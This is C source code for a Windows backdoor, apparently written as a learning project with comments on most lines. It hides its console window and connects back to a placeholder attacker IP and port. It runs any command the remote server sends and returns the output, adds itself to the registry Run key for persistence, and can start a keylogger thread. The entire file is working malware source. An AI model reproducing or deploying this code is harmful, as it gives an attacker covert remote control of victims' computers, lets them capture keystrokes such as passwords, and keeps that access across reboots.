#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>  //for socket programming which is eventually gonna help us set up connection 
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include "keylogger.h"


#define bzero(p,size)(void) memset((p),0,(size))
   //it will two parameters except for three
//	variable,size





//we are using these two below mentioned cause every windows program includes an entry point function that is named something like windows main
//it also needs to create an api entry so we can have access that we are going to use throughtout the program

int sock;

//for persist
int bootRun(){
	char err[128]="Failed\n";   //error variable 
	char suc[128]="Created Persistence At: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";    //successful connection
	//windows 32 character string that used to describe ncdbcs or unicode strings 
	TCHAR szPath[MAX_PATH]; //max path length limitation ->256 characters-> to actually store the path and to get the path to our own malware
	DWORD pathLen=0;   //double word - unsigned 32 bit and it can contain an integer value 
	
	//it will retrieve the fully qualified path for the file that contains the specified module->getting the path to malware 
	pathLen=GetModuleFileName(NULL,szPath,MAX_PATH);
	//check if everything runs successfully 
	if(pathLen == 0){
		send(sock,err,sizeof(err),0);
		return -1;
	}
	//since we are adding registry , we need to add registry key pair value 
	HKEY NewVal;   //handle to an open registry key 
	//opening registry key 
	if(RegOpenKey(HKEY_CURRENT_USER,TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),&NewVal )!=ERROR_SUCCESS){
		send(sock,err,sizeof(err),0);
		return -1;
	}
	//after opening up we need to set the value 
	DWORD pathLenInBytes=pathLen*sizeof(*szPath);
	if(RegSetValueEx(NewVal,TEXT("Hacked"),0,REG_SZ, (LPBYTE)szPath,pathLenInBytes)!=ERROR_SUCCESS){
		RegCloseKey(NewVal);  //close the key 
		send(sock,err,sizeof(err),0);   //
		return -1;
		

	}
	RegCloseKey(NewVal);
	send(sock,suc,sizeof(suc),0);
	return 0;



}

//for slicing 

char *str_cut(char str[],int slice_from,int slice_to){
		
		if(str[0]=='\0')
			return NULL;
		char* buffer;
		size_t str_len,buffer_len;

		if(slice_to < 0 && slice_from > slice_to){
			str_len=strlen(str);
			if(abs(slice_to)>str_len -1)
				return NULL;

			if(abs(slice_from)>str_len)
				slice_from=(-1)* str_len;
			buffer_len=slice_to - slice_from;
			str+=(str_len + slice_from);
		}
		else if(slice_from>=0 && slice_to > slice_from){
			str_len=strlen(str);
			
			if(slice_from > str_len -1)
				return NULL;
			buffer_len=slice_to -slice_from;
			str+=slice_from;
		}
		
		else{

			return NULL;
		}
		buffer=calloc(buffer_len,sizeof(char));
		strncpy(buffer,str,buffer_len);
		return buffer;



}

//bzero function- similar to memset but for linux

void Shell(){
	char buffer[1024]; //receive the actual command from server 
	char container[1024];
	char total_response[18384];
	
	while(1){
	
		 jump:
		bzero(buffer,1024);
		bzero(container,sizeof(container));
		bzero(total_response,sizeof(total_response));
		recv(sock,buffer,1024,0);  //receive the command from our server 
		//socket,storage for cmd ,sizeof storage , we are not defining anything for this parameter
		
		 //if the server wants to quit the connection
		if(strncmp("q",buffer,1)==0){
			closesocket(sock); //connection closes
			WSACleanup();//cleanup after closing 
			exit(0);     //exit
		}
		// for cd command 
		//we are comparing 3 characters cause we are using cd <space>
		else if(strncmp("cd ",buffer,3)==0){
			chdir(str_cut(buffer,3,100)); //specify the name of the directory and then it will change to the specified directory 
			



		}
		//even if the computer is reebot , it will still run 
                else if(strncmp("persist",buffer, 7)==0){
                                bootRun();
                }
		//keylogger
		else if(strncmp("keylog_start",buffer,12)==0){
			HANDLE thread=CreateThread(NULL,0,logg,NULL,0,NULL);
			goto jump;
		}

		else{
			//file descriptor
			FILE* fp;
			fp=_popen(buffer,"r");
			while(fgets(container,1024,fp)!=NULL){//check if the response fits in the container
			//for adding that response to the container
			//first 1024 bytes then second 1024 bytes.....till the size of the response
			//adding that to total_response
				strncat(total_response, container, sizeof(total_response) - strlen(total_response) - 1);

			}
			//send the response to the server 
			send(sock,total_response,sizeof(total_response),0);
			fclose(fp);	

			}
			
		}
		

	}


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,LPSTR lpCmdLine,int nCmdShow){ // each instance represents or is a handle to a module 
//now the operating system uses this value to identify the execuatable 
 
	HWND stealth; // handle to a window with the help of this we can make our window invisible to our target
	AllocConsole(); //allocates new console 
	stealth=FindWindowA("ConsoleWindowClass",NULL); //ConsoleWindowClass:function of queenuser.h
	
	ShowWindow(stealth,0); //whether we want to show the window or not 
	//0 up means hiding the window and activating another window 

	//creation of socket object- which helps to establish connection to the server
	
	//for ip-address and port in order to connect to the backdoor
	struct sockaddr_in ServAddr;
	unsigned short ServPort;
	char *ServIP;
	WSADATA wsaData; // contains info about windows sockets
	
	ServIP="<IP-address of attacker machine>"; //the ip address of the listening machine
	ServPort=<PORT-NO>; //the port that one wants to connect : must be free and not be used by any program
	
	if(WSAStartup(MAKEWORD(2,0),&wsaData) !=0){
		exit(1);
}
	//socket object
	sock=socket(AF_INET,SOCK_STREAM,0); //zero for not defining anything else for that parameter in the function
		// ipv4 connection   tcp connection is used to establish the connection b/w server and target
	
	//clears the function to zeroes
	memset(&ServAddr,0,sizeof(ServAddr));   //12345678->00000000
	//    address      replace to   size of variable 
	
	//parameters of the variable 
	ServAddr.sin_family=AF_INET;
	ServAddr.sin_addr.s_addr=inet_addr(ServIP);  //conversion of ip-address as it was earlier in string format 
	ServAddr.sin_port=htons(ServPort); //conversion for ports


	//establishing connection
	start:
	while (connect(sock,(struct sockaddr *) &ServAddr,sizeof(ServAddr)) !=0){
  // connect until it doesn't  connects
 	//connect in every 10 sec
	Sleep(10);
	goto start;


	}
	//in order to notify that the device has been hacked - useful for pentesting 
	//MessageBox(NULL,TEXT("Your device has been hacked!!!"),TEXT("Windows Installer"),MB_OK | MB_ICONERROR);

// receiving programs from our server and send back the output
	Shell();


	
}
